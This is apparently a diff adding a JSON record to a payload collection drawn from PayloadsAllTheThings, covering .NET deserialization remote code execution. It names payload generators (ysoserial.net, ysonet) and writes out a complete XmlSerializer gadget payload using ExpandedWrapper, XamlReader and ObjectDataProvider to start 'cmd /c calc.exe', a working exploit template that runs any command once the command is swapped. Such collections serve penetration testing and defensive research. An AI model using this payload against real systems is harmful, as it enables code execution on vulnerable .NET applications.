@@ -1,0 +1,27 @@
+{
+  "id": "rce-f22cd160746f",
+  "category": "RCE",
+  "title": "DotNET",
+  "description": "# .NET Deserialization\n\n> .NET serialization is the process of converting an object\u2019s state into a format that can be easily stored or transmitted, such as XML, JSON, or binary. This serialized data can then be saved to a file, sent over a network, or stored in a database. Later, it can be deserialized to reconstruct the original object with its data intact. Serialization is widely used in .NET for tasks like caching, data transfer between applications, and session state management.\n\n## Summary\n",
+  "payloads": [
+    "* [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net) - Deserialization payload generator for a variety of .NET formatters",
+    "* [irsdl/ysonet](https://github.com/irsdl/ysonet) - Deserialization payload generator for a variety of .NET formatters",
+    "![NETNativeFormatters.png](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Insecure%20Deserialization/Images/NETNativeFormatters.png?raw=true)",
+    ".NET Native Formatters from [pwntester/attacking-net-serialization](https://speakerdeck.com/pwntester/attacking-net-serialization?slide=15)",
+    "* In C# source code, look for `XmlSerializer(typeof(<TYPE>));`.",
+    "<?xml version=\"1.0\"?>",
+    "<root type=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\">",
+    "<ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" >",
+    "<ExpandedElement/>",
+    "<ProjectedProperty0>",
+    "<MethodName>Parse</MethodName>",
+    "<MethodParameters>",
+    "<anyType xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xsi:type=\"xsd:string\">",
+    "<![CDATA[<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:d=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:b=\"clr-namespace:System;assembly=mscorlib\" xmlns:c=\"clr-namespace:System.Diagnostics;assembly=system\"><ObjectDataProvider d:Key=\"\" ObjectType=\"{d:Type c:Process}\" MethodName=\"Start\"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c calc.exe</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>",
+    "</anyType>"
+  ],
+  "references": [
+    "PayloadsAllTheThings/Insecure Deserialization/DotNET.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
